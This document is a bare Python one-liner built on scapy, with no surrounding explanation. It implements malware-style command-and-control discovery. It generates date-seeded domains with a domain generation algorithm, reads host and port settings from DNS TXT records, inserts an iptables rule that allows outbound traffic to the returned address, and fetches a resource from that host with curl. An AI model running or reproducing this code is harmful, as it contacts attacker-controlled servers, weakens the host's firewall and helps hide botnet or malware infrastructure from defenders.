python3 -c "import random,datetime,hashlib,subprocess; from scapy.all import IP,UDP,DNS,DNSQR,sr1
seed='txt-seed'; tlds=['org','com','net']
def dga(n):
    base=str(datetime.datetime.utcnow().strftime('%Y%m%d'))+seed
    return [hashlib.md5((base+str(i)).encode()).hexdigest()[:9]+'.'+tlds[i%len(tlds)] for i in range(n)]
dom=None; host=None; port=None; ip=None
for d in dga(25):
    resp=sr1(IP(dst='8.8.8.8')/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname='_cfg.'+d,qtype='TXT')),timeout=3,verbose=0)
    if resp and resp[DNS] and resp[DNS].an:
        for rr in resp[DNS].an:
            if getattr(rr,'type',0)==16:
                try:
                    txt=rr.rdata.decode() if isinstance(rr.rdata,bytes) else rr.rdata
                except Exception:
                    txt=str(rr.rdata)
                if 'host=' in txt and 'port=' in txt:
                    host=txt.split('host=')[1].split(',')[0].strip()
                    port=int(txt.split('port=')[1].split(',')[0].strip())
                    dom=d; break
    if host and port: break
if host and port:
    r2=sr1(IP(dst='9.9.9.9')/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=host,qtype='A')),timeout=3,verbose=0)
    if r2 and r2[DNS] and r2[DNS].an:
        for a in r2[DNS].an:
            if getattr(a,'type',0)==1:
                ip=a.rdata; break
if ip:
    subprocess.run(['iptables','-I','OUTPUT','-p','tcp','-d',ip,'--dport',str(port),'-j','ACCEPT'])
    subprocess.run(['curl','-sS','--connect-timeout','3','--resolve',f'{host}:{port}:{ip}',f'http://{host}:{port}/k'])
    print(dom,host,ip,port)"
